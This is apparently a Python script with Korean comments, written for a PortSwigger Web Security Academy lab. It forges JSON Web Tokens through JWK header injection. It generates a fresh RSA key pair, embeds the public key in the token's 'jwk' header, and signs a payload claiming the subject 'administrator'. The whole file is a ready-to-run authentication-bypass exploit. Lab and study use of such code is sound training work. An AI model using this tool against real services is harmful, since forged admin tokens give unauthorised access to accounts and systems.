from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from termcolor import cprint
import base64
import json

mykey = '''개인키.PEM'''


def getRSAKeyPair():
    # openSSL로 만든 개인키.pem을 가져온다.
    privKey = RSA.importKey(mykey)
    # 개인키를 이용해서 공개키 생성
    pubKey = privKey.publickey().exportKey("PEM")
    # 생성한 공개키, 개인키 리턴
    return pubKey, privKey


def newRSAKeyPair():
    # RSA 개인키 생성(메모리 주소 전달)
    newKey = RSA.generate(2048, e=65537)
    # 메모리에서 개인키를 PEM구조로 래핑하여 추출
    privKey = newKey.exportKey("PEM")
    # 메모리에서 개인키를 퍼블릭 키로 변환하고 PEM구조로 래핑하여 추출
    pubKey = newKey.publickey().exportKey("PEM")
    return pubKey, privKey


# 익스플로잇용 JWK 생성
def buildEmptyJWKs(n, e, kid):
    newjwks = {}
    newjwks["kty"] = "RSA"
    newjwks["kid"] = kid
    newjwks["use"] = "sig"
    # urlsafe_base64로 인코딩되기 때문에 디코딩해준다.
    newjwks["e"] = str(e.decode('UTF-8'))
    # 디코딩 후 필요없는 패딩(=)을 지운다.
    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
    return newjwks

# 단순 파이썬 딕셔너리인 헤더를 json형식으로 변경(비슷하게 생겼다고 헷갈리지 말자)
# JWT로 사용하기 위해 urlsafe_base64인코딩 수행
# 단, urlsafe_base64는 바이트 데이터만 받기 때문에 str값인 json헤더를 .encode로 바이트화 시키고 base64인코딩 후에 다시 str(UTF-8)값으로 변환


def genContents(header, payload, newContents=""):
    # 페이로드 미설정시 json 변환 후 urlsafe_base64로 변환한 헤더값만 리턴
    if payload == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(
            header, separators=(",", ":")).encode()).decode('UTF-8').strip("=")+"."

    # 페이로드 설정시 json 변환 후 urlsafe_base64로 변환한 헤더값+페이로드값 리턴
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(
            header, separators=(",", ":")).encode()).decode('UTF-8').strip("=")+"." +\
            base64.urlsafe_b64encode(json.dumps(
                payload, separators=(",", ":")).encode()).decode('UTF-8').strip("=")
    # print('newContests:')
    # print(newContents)
    # print('\n')
    return newContents.encode().decode('UTF-8')


def jwksEmbed(newHeader, newPayload):
    # 공개, 개인키를 가져온다.
    pubKey, privKey = newRSAKeyPair()
    # PEM구조인 공개키를 n,e 키 형태로 변환 추출한다.
    newKey = RSA.importKey(pubKey)
    # n과 e를 사용하기 위해 urlsafe_base64로 인코딩한다.
    n = base64.urlsafe_b64encode(newKey.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(newKey.e.to_bytes(3, byteorder='big'))

    # newjwks에 생성한 JWK를 받아온다.
    newjwks = buildEmptyJWKs(
        n, e, "2cf80149-4451-4d38-8ffb-173ea0b1f9dd")  # 뒤쪽 str는 kid

    # 기존 헤더에 JWK값 추가
    newHeader["jwk"] = newjwks
    # alg가 지정이 안됐을 경우를 대비한 최신화
    newHeader["alg"] = "RS256"

    key = RSA.importKey(privKey)

    # 생성한 JWK가 포함된 헤더와 사용자 커스텀 페이로드 전달
    newContents = genContents(newHeader, newPayload)
    # 해시화와 서명을 위해 데이터 처리를 위해 바이트화(.encode) 진행
    newContents = newContents.encode('UTF-8')

    # 생성된 header+payload JWT로 SHA256해시 생성
    h = SHA256.new(newContents)
    # 개인 키를 이용한 PKCS1_v1_5 서명 객체 생성
    signer = PKCS1_v1_5.new(key)

    try:
        # 생성한 PKCS1_v1_5 서명 객체로 newContents 해시 값 서명 진행
        signature = signer.sign(h)
    except:
        # 개인키 못읽거나 없음, 타입 안맞아도 이럼
        cprint("Invalid Private Key", "red")
        exit(1)

    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')


testHeader = {
    "alg": "RS256"
}
testPayload = {
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1672144865
}

newSig, newContents = jwksEmbed(testHeader, testPayload)
print(newContents+'.'+newSig)
